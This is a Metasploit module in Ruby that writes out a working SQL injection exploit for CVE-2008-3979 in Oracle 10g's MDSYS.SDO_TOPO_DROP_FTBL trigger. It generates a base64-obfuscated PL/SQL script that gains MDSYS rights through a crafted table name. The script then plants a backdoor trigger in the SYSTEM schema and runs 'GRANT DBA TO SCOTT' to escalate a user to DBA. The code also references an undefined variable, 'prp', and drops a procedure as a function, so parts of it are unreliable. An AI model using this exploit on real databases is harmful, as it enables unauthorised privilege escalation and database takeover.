Oracle 10g MDSYS.SDO_TOPO_DROP_FTBL SQL Injection Exploit (meta)
================================================================




##
# $Id: droptable_trigger.rb
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require &#039;msf/core&#039;


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;SQL Injection in  MDSYS.SDO_TOPO_DROP_FTBL Trigger.&#039;,
			&#039;Description&#039;    => %q{
					This module will escalate a Oracle DB user to MDSYS by exploiting an sql injection bug in
					the MDSYS.SDO_TOPO_DROP_FTBL trigger. After that exploit escalate user to DBA using "CREATE ANY TRIGGER" privilege
					given to MDSYS user by creating evil trigger in system scheme (2-stage attack).
			},
			&#039;Author&#039;         => [ &#039;Sh2kerr <research[ad]dsec.ru>&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision:$&#039;,
			&#039;References&#039;     =>
				[
					[ &#039;CVE&#039;, &#039;2008-3979&#039; ],
					[ &#039;URL&#039;, &#039;http://www.securityfocus.com/archive/1/500061&#039; ],
					[ &#039;URL&#039;, &#039;http://www.ngssoftware.com/&#039; ],
				],
			&#039;DisclosureDate&#039; => &#039;Jan 13 2009&#039;))

			register_options( 
				[
					OptString.new(&#039;SQL&#039;,      [ false, &#039;The SQL to execute.&#039;,  &#039;GRANT DBA TO SCOTT&#039;]),
					OptString.new(&#039;USER&#039;,      [ false, &#039;The current user. &#039;,  &#039;SCOTT&#039;]),
					OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;,  &#039;msf.sql&#039;]),
					OptString.new(&#039;OUTPUTPATH&#039;, [ false, &#039;The location of the file.&#039;,  &#039;./data/exploits/&#039;]),
				
				], self.class)
	end

	def run
		name1  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		name2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand4 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand5 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)

		function1 = %Q|
			CREATE OR REPLACE PROCEDURE #{name1}
			AUTHID CURRENT_USER AS
			PRAGMA AUTONOMOUS_TRANSACTION; 
			BEGIN EXECUTE IMMEDIATE &#039;#{datastore[&#039;SQL&#039;]}&#039;; 
			END;
			|


		function2 = %Q|
			CREATE OR REPLACE FUNCTION #{name2} RETURN number AUTHID CURRENT_USER is
			PRAGMA AUTONOMOUS_TRANSACTION;
			STMT VARCHAR2(400):= &#039;create or replace trigger system.evil_trigger before insert on system.DEF$_TEMP$LOB DECLARE msg VARCHAR2(10);
			BEGIN #{datastore[&#039;USER&#039;]}.#{name1};
			end evil_trigger;&#039;;
			BEGIN
			EXECUTE IMMEDIATE STMT;
			COMMIT;
			RETURN 1;
			END;
			|

		
		exploiting1 ="drop table \"O&#039; and 1=#{datastore[&#039;USER&#039;]}.#{name2}--\""
		
		exploiting2 = "insert into system.DEF$_TEMP$LOB (TEMP$BLOB) VALUES (&#039;AA&#039;)"
		
		fun1  = Rex::Text.encode_base64(function1)
		fun2 = Rex::Text.encode_base64(function2)
		exp1 = Rex::Text.encode_base64(exploiting1)
		exp2 = Rex::Text.encode_base64(exploiting2)
		

		sql = %Q|
			DECLARE
			#{rand1} VARCHAR2(32767);
			#{rand2} VARCHAR2(32767);
			#{rand3} VARCHAR2(32767);
			#{rand4} VARCHAR2(32767);
			#{rand5} VARCHAR2(32767);
			BEGIN
			#{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw(&#039;#{fun1}&#039;)));
			EXECUTE IMMEDIATE #{rand1};
			EXECUTE IMMEDIATE &#039;GRANT EXECUTE ON #{name1} TO PUBLIC&#039;;
			#{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw(&#039;#{fun2}&#039;)));
			EXECUTE IMMEDIATE #{rand2};
			EXECUTE IMMEDIATE &#039;GRANT EXECUTE ON #{name2} TO PUBLIC&#039;;
			#{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw(&#039;#{prp}&#039;)));
			EXECUTE IMMEDIATE #{rand3};
			#{rand4} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw(&#039;#{exp1}&#039;)));
			EXECUTE IMMEDIATE #{rand4};
			#{rand5} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw(&#039;#{exp2}&#039;)));
			EXECUTE IMMEDIATE #{rand5};
			END;
			/
			DROP FUNCTION #{name1};
			DROP FUNCTION #{name2};
			|


		print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")		
		file_create(sql)


	end

end 



